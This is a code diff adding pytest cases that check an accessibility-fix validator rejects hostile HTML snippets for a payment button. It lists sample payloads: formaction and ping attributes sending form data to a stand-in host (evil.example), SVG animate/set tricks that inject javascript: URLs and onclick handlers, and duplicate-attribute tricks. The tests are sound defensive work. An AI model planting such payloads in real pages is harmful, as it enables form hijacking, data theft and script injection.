@@ -238,3 +238,28 @@ def test_validator_rejects_markup_declarations_and_comments(snippet):
 
     with pytest.raises(FixRejected):
         validate_snippet(BEFORE, snippet)
+
+
+@pytest.mark.parametrize("snippet", [
+    '<button id="f5" formaction="https://evil.example/collect">Pay R1,249</button>',  # where the form submits is not an accessibility fix
+    '<button id="f5" formmethod="get" formtarget="_blank" formaction="//evil.example">Pay R1,249</button>',
+    '<button id="f5"><svg><a><animate attributeName="href" values="javascript:alert(1)"/></a></svg></button>',
+    '<button id="f5"><svg><set attributeName="onclick" to="alert(1)"/></svg></button>',
+    '<button id="f5" id="evil">Pay R1,249</button>',  # the browser keeps the first id, the check used to read the last
+    '<button id="f5" aria-label="Pay" aria-label="Submit">x</button>',
+    '<button id="f5" ping="https://evil.example/p">Pay R1,249</button>',
+])
+def test_validator_rejects_navigation_hijacks_and_duplicate_attributes(snippet):
+    from parity.pipeline.fixer import validate_snippet
+
+    with pytest.raises(FixRejected):
+        validate_snippet(BEFORE, snippet)
+
+
+def test_validator_keeps_an_existing_formaction_unchanged():
+    from parity.pipeline.fixer import validate_snippet
+
+    before = '<button id="go" formaction="/checkout/pay" aria-label="Submit">Pay R1,249</button>'
+    validate_snippet(before, '<button id="go" formaction="/checkout/pay">Pay R1,249</button>')  # the same destination as before
+    with pytest.raises(FixRejected):
+        validate_snippet(before, '<button id="go" formaction="/checkout/other">Pay R1,249</button>')
